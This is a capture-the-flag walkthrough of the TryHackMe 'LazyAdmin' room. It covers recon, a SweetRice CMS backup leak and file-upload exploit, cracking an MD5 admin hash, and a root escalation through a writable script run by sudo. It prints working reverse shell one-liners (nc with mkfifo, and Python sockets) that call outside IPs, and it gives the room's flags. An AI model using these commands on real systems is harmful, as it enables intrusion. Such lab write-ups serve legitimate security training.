# Tryhackme.com Room : LazyAdmin
`https://tryhackme.com/room/lazyadmin`


# Instance
```
export IP=10.10.88.11
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Let's browse the websiBte. It's just the default install page.

Let's gobuster `gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  --url http://$`

We find a `asic-cms SweetRice` install at `/content`

We gobuster `/content/` `gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  --url http://$/content`

```
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)
```

we find the cms version in `/content/inc/latest.txt`
```
1.5.1
```

We find this exploit `https://www.exploit-db.com/exploits/40716` to upload a file on the server.

We also find `https://www.exploit-db.com/exploits/40718` which let us download an sql backup from `/content/inc/mysql_backup`

We parse the sql file and find the admin account:
```
manager:42f749ade7f9e195bf475f37a44cafcb
```

The md5 hash encode
```
Password123
```

`/content/as` is a login page

We use these credentials to login.

We can then use the arbitraty file upload exploit to upload a php reverse shell.

We tried reverse shell from `https://github.com/pentestmonkey/php-reverse-shell` but it didn't work for some reason. We used this one `https://gist.github.com/rshipp/eee36684db07d234c1cc`

Seems like we can't upload `.php` file. The exploit suggest using `.php5` which work and give us a reverse shell


We are logged in as `www-data`
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Files in `/home/itguy`:
```
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
drwx------  3 itguy itguy 4096 Nov 29  2019 .local
drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
```

User flag `cat /home/itguy/user.txt`:
```
THM{63e5bce9271952aad1113b6f1ac28a07}
```


`sudo -l` give us
```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
We can run `/home/itguy/backup.pl` as root

The script contains:
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

`/etc/copy.sh` contains
```
rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.190 5554 > /tmp/f
```


Seems like we can write to `/etc/copy.sh`

We write


```
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.240.128\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /etc/copy.sh
```

We execute the script
```
sudo /usr/bin/perl /home/itguy/backup.pl
```

Anddd im root
```
uid=0(root) gid=0(root) groups=0(root)
```

`cat /root/root.txt` :
```
THM{6637f41d0177b6f37cb20d775124699f}
```